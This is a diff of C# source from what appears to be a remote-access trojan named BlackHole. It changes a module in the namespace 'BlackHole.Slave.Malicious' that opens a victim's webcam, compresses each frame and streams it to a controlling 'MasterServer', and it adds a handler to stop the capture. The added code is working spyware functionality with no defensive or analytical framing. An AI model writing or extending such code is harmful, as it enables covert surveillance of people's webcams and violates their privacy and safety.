@@ -1,12 +1,11 @@
-﻿using System;
-using System.Drawing;
+﻿using System.Drawing;
 using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
-using System.Threading;
-using System.Threading.Tasks;
 using AForge.Video.DirectShow;
 using BlackHole.Common;
+using BlackHole.Common.Helpers;
 using BlackHole.Common.Network.Protocol;
+using BlackHole.Slave.Helper;
 
 namespace BlackHole.Slave.Malicious
 {
@@ -16,24 +15,27 @@ namespace BlackHole.Slave.Malicious
         private VideoCaptureDevice _videoDevice;
         private FilterInfoCollection _videoDevices;
 
+        private StartWebcamCaptureMessage _startMessage;
+
         public void Initialize()
         {
             _videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
             //foreach (FilterInfo device in _videoDevices)
-            //devicesCombo.Items.Add(device.Name);
+                //devicesCombo.Items.Add(device.Name);
         }
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="message"></param>
-        public void StartScreenCapture(StartScreenCaptureMessage message)
+        public void StartScreenCapture(StartWebcamCaptureMessage message)
         {
+            _startMessage = message;
             MasterServer.Instance.SendStatus(message.WindowId, "Webcam capture", "Started capturing webcam...");
 
             _videoDevice = new VideoCaptureDevice(_videoDevices[0].MonikerString);
             _videoDevice.NewFrame += _videoDevice_NewFrame;
-
+            
             _videoDevice.VideoResolution = VideoCapabilities[0];
             _videoDevice.Start();
 
@@ -47,21 +49,27 @@ namespace BlackHole.Slave.Malicious
 
         }
 
-        public byte[] BitmapToByteArray(Bitmap bitmap)
-        {
-            BitmapData bmpdata = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height),
-                ImageLockMode.ReadOnly, bitmap.PixelFormat);
-
-            byte[] bytedata = new byte[bmpdata.Stride * bitmap.Height];
-            Marshal.Copy(bmpdata.Scan0, bytedata, 0, bytedata.Length);
-            return bytedata;
-        }
-
         private void _videoDevice_NewFrame(object sender, AForge.Video.NewFrameEventArgs eventArgs)
         {
-            var bitmapArray = BitmapToByteArray(eventArgs.Frame);
+            var bitmapArray = ImageHelpers.CompressImage(eventArgs.Frame, _startMessage.Quality);
 
-            string s = "";
+            MasterServer.Instance.ExecuteComplexSendOperation(_startMessage.WindowId,
+                         "Webcam capture",
+                         () => new WebcamCaptureMessage
+                         {
+                             RawImage = bitmapArray,
+                             Width = _videoDevice.VideoResolution.FrameSize.Width,
+                             Height = _videoDevice.VideoResolution.FrameSize.Height,
+                             Quality = _startMessage.Quality,
+                             ScreenNumber = _startMessage.ScreenNumber,
+                             FrameRate = _videoDevice.VideoResolution.AverageFrameRate
+                         });
+        }
+
+        public void StopScreenCapture(StopWebcamCaptureMessage message)
+        {
+            _videoDevice.Stop();
+            MasterServer.Instance.SendStatus(message.WindowId, "Webcam capture", "Stopped capturing...");
         }
     }
 }
